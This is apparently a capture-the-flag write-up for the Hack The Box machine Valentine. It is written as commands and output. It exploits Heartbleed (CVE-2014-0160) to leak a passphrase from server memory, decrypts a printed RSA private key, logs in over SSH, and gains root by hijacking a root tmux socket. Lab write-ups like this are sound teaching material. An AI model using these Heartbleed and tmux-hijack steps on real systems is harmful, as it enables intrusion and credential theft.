`Box: Linux`
`Level: Easy`
### Index
1. [`Box Info`](#`Box%20Info`)
2. [Web Enum](#Web%20Enum)
3. [`Heartbleed Exploitation`](#`Heartbleed%20Exploitation`)
	1. [`CVE-2014-0160`](#`CVE-2014-0160`)
	2. [`GoBuster Enumerations`](#`GoBuster%20Enumerations`)
	3. [`Obtaining passowrd for user hype`](#`Obtaining%20passowrd%20for%20user%20hype`)
	4. [`Decrypting the Hype_Key`](#`Decrypting%20the%20Hype_Key`)
4. [`Privilege Escalation`](#`Privilege%20Escalation`)

### `Box Info`
```
Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.
```
### Initial Nmap Enum
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.10.79
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2024-10-02T05:17:18+00:00; 0s from scanner time.
```

### Web Enum

![](Valentine_Web0.png)

Looking at the initial image, it seems like this box is vulnerable to Heartbleed. I can guess the vulnerability from two things. The name of the Box `Valentine` and the image we are seeing above. Running a simple checks using nmap confirms the finding.
```
# nmap -p443 --min-rate=1000 --script "ssl-heartbleed" -sC -sV -T3 10.10.10.79
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://cvedetails.com/cve/2014-0160/
```

### `Heartbleed Exploitation`
###### `CVE-2014-0160`
```
# python2 32745.py 10.10.10.79 -p 443
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 00 00 00 00  ....#...........
  00e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  00f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
```

We will need to run this a lot of times to collect the bunch of data from the server. So I ran the following command to run it in a sequence.
```
# for i in $(seq 1 100000);do python2 32745.py -p 443 | grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' > data_dump$; done

```

###### `GoBuster Enumerations`
```
# gobuster dir -u https://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 310] [--> https://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 293]
Progress: 220560 / 220561 (100.00%)
===============================================================
```

The `/encode` and `/decode` page use for encoding and decoding string to base64.

###### `Obtaining passowrd for user hype`
Using the [Heartbleed Exploit](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py) I was able to send multiple number of requires which reveals the base64 key.
```
# python2 heartbleed.py 10.10.10.79 -p 443 -n 10

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 10 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 10 of 10
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.<.).b./.O..J.R7.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

```

Decoding the `$text` got us the password for the hype_key 
```
# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d 
heartbleedbelievethehype
```

Now we know we have the hype_key but we will need it decrypt it.
###### `Decrypting the Hype_Key`
```
# xxd -r -p hype_key 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----                                                                                                                           
```

Now we got the decrypted private key for the user hype and got the password for this private key above. We are going to convert this to RSA and get ssh
```
# openssl rsa -in hypeuser.key -out hypeuserdecrypted.key
Enter pass phrase for hypeuser.key:
writing RSA key
```

If the `Bad Permission` error received while trying out the key  than set `chmod 600` to the key file.

```
# ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hypeuserdecrypted.key hype@10.10.10.79
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ #
```

### `Privilege Escalation`

I ran `LinPeas.sh` and found few things but posting only something interesting that got me the root flag swiftly 
```
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                             
root          1  0.0  0.2  24512  2424 ?        Ss   21:50   0:00 /sbin/init                                                                                            
root        311  0.0  0.0  17224   636 ?        S    21:50   0:00 upstart-udev-bridge --daemon[0m
root        317  0.0  0.1  22008  1836 ?        Ss   21:50   0:00 /sbin/udevd --daemon[0m
root        538  0.0  0.1  21852  1224 ?        S    21:50   0:00  _ /sbin/udevd --daemon[0m
root        539  0.0  0.1  21936  1292 ?        S    21:50   0:00  _ /sbin/udevd --daemon[0m
syslog      536  0.0  0.1 249464  1624 ?        Sl   21:50   0:00 rsyslogd -c5
102         556  0.0  0.1  24072  1268 ?        Ss   21:50   0:00 dbus-daemon[0m --system --fork --activation=upstart
root        574  0.0  0.3  79036  3208 ?        Ss   21:50   0:00 /usr/sbin/modem-manager
root        581  0.0  0.1  21180  1712 ?        Ss   21:50   0:00 /usr/sbin/bluetoothd
avahi       590  0.0  0.0  32172   472 ?        S    21:50   0:00  _ avahi-daemon[0m: chroot helper
root        618  0.0  0.4 104088  4072 ?        Ss   21:50   0:00 /usr/sbin/cupsd -F
root        631  0.0  0.6 174444  6528 ?        Ssl  21:50   0:00 NetworkManager
root        674  0.0  0.3 203500  3888 ?        Sl   21:50   0:00 /usr/lib/policykit-1/polkitd --no-debug
root        745  0.0  0.0  15180   400 ?        S    21:50   0:00 upstart-socket-bridge --daemon[0m
root        916  0.0  0.2  49952  2856 ?        Ss   21:51   0:00 /usr/sbin/sshd -D
hype       4485  0.0  0.1  92220  1676 ?        S    22:39   0:00      _ sshd: hype@pts/0    
hype       4486  0.0  0.8  31608  8684 pts/0    Ss   22:39   0:00          _ -bash
hype       4622  0.1  0.1   5120  1440 pts/0    S+   22:50   0:00              _ /bin/sh ./linpeas.sh
hype       9356  0.0  0.1   5120  1008 pts/0    S+   22:50   0:00                  _ /bin/sh ./linpeas.sh
hype       9360  0.0  0.1  22464  1224 pts/0    R+   22:50   0:00                  |   _ ps fauxwww
hype       9359  0.0  0.0   5120   836 pts/0    S+   22:50   0:00                  _ /bin/sh ./linpeas.sh
root       1004  0.0  0.0  19976   976 tty4     Ss+  21:51   0:00 /sbin/getty -8 38400 tty4
root       1014  0.0  0.0  19976   976 tty5     Ss+  21:51   0:00 /sbin/getty -8 38400 tty5
root       1020  0.0  0.1  26416  1672 ?        Ss   21:51   0:01 /usr/bin/tmux -S /.devs/dev_sess
root       1026  0.0  0.4  20652  4576 pts/15   Ss+  21:51   0:00  _ -bash
root       1027  0.0  0.0  19976   972 tty2     Ss+  21:51   0:00 /sbin/getty -8 38400 tty2
root       1028  0.0  0.0  19976   972 tty3     Ss+  21:51   0:00 /sbin/getty -8 38400 tty3
root       1033  0.0  0.0  19976   976 tty6     Ss+  21:51   0:00 /sbin/getty -8 38400 tty6
```

Look at the `root       1020  0.0  0.1  26416  1672 ?        Ss   21:51   0:01 /usr/bin/tmux -S /.devs/dev_sess` Line. The Tmux session is running as a root user which we can switch to.

```
hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
root@Valentine:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
Get your root flag.